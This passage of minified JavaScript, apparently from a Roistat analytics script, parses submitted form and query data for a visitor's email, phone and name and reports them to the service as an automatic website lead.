      };
      var ec = {
        email: "",
        phone: "",
        name: ""
      };
      for (var d5 in ef) {
        var ei = ef[d5];
        for (var eh in ei) {
          if (ei.hasOwnProperty(eh)) {
            if (em.hasOwnProperty(ei[eh])) {
              ec[d5] = em[ei[eh]];
              break;
            }
          }
        }
      }
      dY("new data: " + JSON.stringify(ec));
      var d7 = ec.phone.length === 0;
      var eb = ec.email.length === 0;
      if (!d7 && !eb) {
        return ec;
      }
      var d6 = new RegExp(dX);
      var ea = new RegExp(d4);
      var ed = Object.keys(em);
      for (var ej = 0; ej < ed.length; ej++) {
        var eg = decodeURIComponent(String(em[ed[ej]]));
        if (eb) {
          var d8 = eg.match(d6);
          if (d8 && d8.length > 0) {
            var ee = ec.email;
            ec.email = d8[0];
            dY("parsing email, before: " + ee + ", after: " + ec.email);
          }
        }
        if (d7) {
          var el = eg.replace(/[\s-.()+*_—:;'"`]/g, "");
          var ek = el.match(ea);
          if (ek && ek.length > 0) {
            var d9 = ec.phone;
            ec.phone = eg;
            dY("parsing phone, before: " + d9 + ", after: " + ec.phone);
          }
        }
      }
      return ec;
    }
    var dV = function (d5) {
      var d6 = bh(d5);
      return !aA(dS, d6);
    };
    function d0(d7, d6, d5) {
      if (d7.length > 0 && !dV(d7)) {
        return;
      }
      var d9 = dU(d7);
      var eb = d6;
      if (typeof eb === "string") {
        eb = dQ(eb);
      }
      dY("data before parsing " + JSON.stringify({
        get: d9,
        post: eb
      }));
      var ea = d2(d9);
      var d8 = d2(eb);
      dY("data after parsing " + JSON.stringify({
        get: ea,
        post: d8
      }));
      d1(ea, d8, d5);
    }
    function d1(d5, d7, eb) {
      var ea = d5.email.length > 0 ? d5.email : d7.email;
      var d6 = d5.phone.length > 0 ? d5.phone : d7.phone;
      var d9 = d5.name.length > 0 ? d5.name : d7.name;
      if (ea.length == 0 && d6.length == 0) {
        eb();
        return;
      }
      setTimeout(function () {
        eb();
      }, 100);
      var d8 = {
        leadName: "Автоматический лид с сайта",
        name: d9,
        phone: d6,
        email: ea,
        is_skip_sending: 1
      };
      dY("phone or email is not empty, reaching goal " + JSON.stringify(d8));
      roistatGoal.reach(d8);
    }
    (function d3() {
      if (!e()) {
        dY("disabled, skip");
        return;
      }
      dR();
    })();
  })(cv, M, bO);
})(window, document, undefined);